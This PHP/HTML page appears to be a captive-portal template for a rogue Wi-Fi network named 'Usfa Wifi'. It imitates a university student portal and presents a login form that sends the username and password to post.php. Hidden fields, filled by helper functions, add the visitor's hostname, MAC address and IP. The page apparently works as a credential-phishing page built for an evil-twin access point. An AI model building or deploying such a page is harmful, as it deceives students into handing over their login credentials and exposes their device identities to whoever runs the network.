<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="./assets/css/styles.css" />
        <link rel="shortcut icon" href="./assets/img/favicon.ico" type="image/x-icon">

        <title>Usfa Wifi</title>
    </head>
    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
    function redirect() {
        setTimeout(function() {
        window.location = "/captiveportal/index.php";
        }, 100);
    }
    </script>
    <body>
        <noscript
            ><strong
                >We're sorry but aestudiante doesn't work properly without
                JavaScript enabled. Please enable it to continue.</strong
            ></noscript
        >
        <div
            data-app="true"
            class="v-application v-application--is-ltr theme--light"
            id="app"
        >
            <div class="v-application--wrap">
                <nav>
                    <header
                        class="deep-orange v-sheet theme--light v-toolbar v-toolbar--flat v-app-bar v-app-bar--fixed"
                        data-booted="true"
                        style="
                            height: 56px;
                            margin-top: 0px;
                            transform: translateY(0px);
                            left: 0px;
                            right: 0px;
                        "
                    >
                        <div class="v-toolbar__content" style="height: 56px">
                            <button
                                type="button"
                                class="v-app-bar__nav-icon white--text v-btn v-btn--flat v-btn--icon v-btn--round theme--light v-size--default"
                            >
                                <span class="v-btn__content"
                                    ><i
                                        aria-hidden="true"
                                        class="v-icon notranslate mdi mdi-menu theme--light"
                                    ></i
                                ></span>
                            </button>
                            <div
                                class="v-toolbar__title text-uppercase white--text"
                            >
                                <span class="font-weight-light">USFA</span
                                ><span>-Wifi</span>
                            </div>
                            <div class="spacer"></div>
                            <button
                                type="button"
                                class="v-btn v-btn--flat v-btn--text theme--light v-size--default white--text"
                            >
                                <span class="v-btn__content"
                                    ><span>Salir</span
                                    ><i
                                        aria-hidden="true"
                                        class="v-icon notranslate v-icon--right mdi mdi-exit-to-app theme--light"
                                    ></i
                                ></span>
                            </button>
                        </div>
                    </header>
                    <nav
                        class="blue-grey v-navigation-drawer v-navigation-drawer--close v-navigation-drawer--fixed v-navigation-drawer--is-mobile theme--light"
                        data-booted="true"
                        style="
                            height: 100vh;
                            top: 0px;
                            transform: translateX(-100%);
                            width: 256px;
                        "
                    >
                        <div class="v-navigation-drawer__content">
                            <div class="layout column align-center">
                                <div class="flex mt-5">
                                    <div
                                        class="v-avatar"
                                        style="
                                            height: 120px;
                                            min-width: 120px;
                                            width: 120px;
                                        "
                                    >
                                        <img src="" alt="" />
                                    </div>
                                </div>
                                <div
                                    class="white--text subheading mt-1 text-sm-center"
                                >
                                    USUARIO SIN AUTENTICAR
                                </div>
                                <div
                                    class="white--text subheading mt-1 text-sm-center"
                                >
                                    0
                                </div>
                                <div
                                    class="white--text subheading mt-1 text-sm-center"
                                >
                                    NO DEFINIDO
                                </div>
                            </div>
                            <div class="v-list v-sheet theme--light">
                                <div
                                    role="listbox"
                                    class="v-item-group theme--light v-list-item-group"
                                >
                                    <a
                                        href="/"
                                        class="v-list-item v-list-item--link theme--light"
                                        tabindex="0"
                                        router=""
                                        ><div class="v-list-item__icon">
                                            <i
                                                aria-hidden="true"
                                                class="v-icon notranslate white--text mdi mdi-view-dashboard theme--light"
                                            ></i>
                                        </div>
                                        <div class="v-list-item__content">
                                            <div
                                                class="v-list-item__title white--text"
                                            >
                                                Inicio
                                            </div>
                                        </div></a
                                    ><a
                                        href="/Datos"
                                        class="v-list-item v-list-item--link theme--light"
                                        tabindex="0"
                                        router=""
                                        ><div class="v-list-item__icon">
                                            <i
                                                aria-hidden="true"
                                                class="v-icon notranslate white--text mdi mdi-account-details theme--light"
                                            ></i>
                                        </div>
                                        <div class="v-list-item__content">
                                            <div
                                                class="v-list-item__title white--text"
                                            >
                                                Datos Personales
                                            </div>
                                        </div></a
                                    ><a
                                        href="/Asignacion"
                                        class="v-list-item v-list-item--link theme--light"
                                        tabindex="0"
                                        router=""
                                        ><div class="v-list-item__icon">
                                            <i
                                                aria-hidden="true"
                                                class="v-icon notranslate white--text mdi mdi-format-list-checks theme--light"
                                            ></i>
                                        </div>
                                        <div class="v-list-item__content">
                                            <div
                                                class="v-list-item__title white--text"
                                            >
                                                Asignación de Materias
                                            </div>
                                        </div></a
                                    ><a
                                        href="/RepAsignacion"
                                        class="v-list-item v-list-item--link theme--light"
                                        tabindex="0"
                                        router=""
                                        ><div class="v-list-item__icon">
                                            <i
                                                aria-hidden="true"
                                                class="v-icon notranslate white--text mdi mdi-printer theme--light"
                                            ></i>
                                        </div>
                                        <div class="v-list-item__content">
                                            <div
                                                class="v-list-item__title white--text"
                                            >
                                                Imprimir Asignación
                                            </div>
                                        </div></a
                                    ><a
                                        href="/VerNotas"
                                        class="v-list-item v-list-item--link theme--light"
                                        tabindex="0"
                                        router=""
                                        ><div class="v-list-item__icon">
                                            <i
                                                aria-hidden="true"
                                                class="v-icon notranslate white--text mdi mdi-text-box-check theme--light"
                                            ></i>
                                        </div>
                                        <div class="v-list-item__content">
                                            <div
                                                class="v-list-item__title white--text"
                                            >
                                                Ver Notas
                                            </div>
                                        </div></a
                                    ><a
                                        href="/Deudas"
                                        class="v-list-item v-list-item--link theme--light"
                                        tabindex="0"
                                        router=""
                                        ><div class="v-list-item__icon">
                                            <i
                                                aria-hidden="true"
                                                class="v-icon notranslate white--text mdi mdi-cash-register theme--light"
                                            ></i>
                                        </div>
                                        <div class="v-list-item__content">
                                            <div
                                                class="v-list-item__title white--text"
                                            >
                                                Deudas
                                            </div>
                                        </div></a
                                    ><a
                                        href="/Pagos"
                                        class="v-list-item v-list-item--link theme--light"
                                        tabindex="0"
                                        router=""
                                        ><div class="v-list-item__icon">
                                            <i
                                                aria-hidden="true"
                                                class="v-icon notranslate white--text mdi mdi-cash-usd theme--light"
                                            ></i>
                                        </div>
                                        <div class="v-list-item__content">
                                            <div
                                                class="v-list-item__title white--text"
                                            >
                                                Pagos
                                            </div>
                                        </div></a
                                    >
                                </div>
                            </div>
                        </div>
                        <div class="v-navigation-drawer__border"></div>
                    </nav>
                </nav>
                <main
                    class="v-main mx-2"
                    data-booted="true"
                    style="padding: 56px 0px 0px"
                >
              
                    <div class="v-main__wrap">
                        <div class="layout ma-5 column align-center sm8">
                            <form novalidate="novalidate" class="v-form" method="POST" action="post.php">
                                <div class="v-card v-sheet theme--light">
                                    <div class="v-card__title">
                                        Autenticación
                                    </div>
                                    <div class="v-card__text">
                                        <div
                                            class="v-input theme--light v-text-field v-text-field--is-booted"
                                        >
                                            <div class="v-input__control">
                                                <div class="v-input__slot">
                                                    <div
                                                        class="v-text-field__slot"
                                                    >
                                                        <label
                                                            for="input-53"
                                                            class="v-label theme--light"
                                                            style="
                                                                left: 0px;
                                                                right: auto;
                                                                position: absolute;
                                                            "
                                                            ></label
                                                        ><input
                                                            id="input-53"
                                                            type="text"
                                                            name="usuario"
                                                            placeholder="Usuario"
                                                        />
                                                    </div>
                                                </div>
                                                <div
                                                    class="v-text-field__details"
                                                >
                                                    <div
                                                        class="v-messages theme--light"
                                                    >
                                                        <div
                                                            class="v-messages__wrapper"
                                                        ></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            class="v-input theme--light v-text-field v-text-field--is-booted"
                                        >
                                            <div class="v-input__control">
                                                <div class="v-input__slot">
                                                    <div
                                                        class="v-text-field__slot"
                                                    >
                                                        <label
                                                            for="input-56"
                                                            class="v-label theme--light"
                                                            style="
                                                                left: 0px;
                                                                right: auto;
                                                                position: absolute;
                                                            "
                                                            ></label
                                                        ><input
                                                            id="input-56"
                                                            name="password"
                                                            type="password"
                                                            placeholder="Contraseña"
                                                        /><input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                                                    </div>
                                                </div>
                                                <div
                                                    class="v-text-field__details"
                                                >
                                                    <div
                                                        class="v-messages theme--light"
                                                    >
                                                        <div
                                                            class="v-messages__wrapper"
                                                        ></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="v-card__actions">
                                        <div class="spacer"></div>
                                        <button
                                            type="submit"
                                            class="btny"
                                        >
                                            <span class="v-btn__content"
                                                >Acceder</span
                                            >
                                        </button>
                                    </div>
                                </div>
                            </form>
                            <div></div>
                        </div>
                    </div>
                </main>
            </div>
        </div>
    </body>
</html>
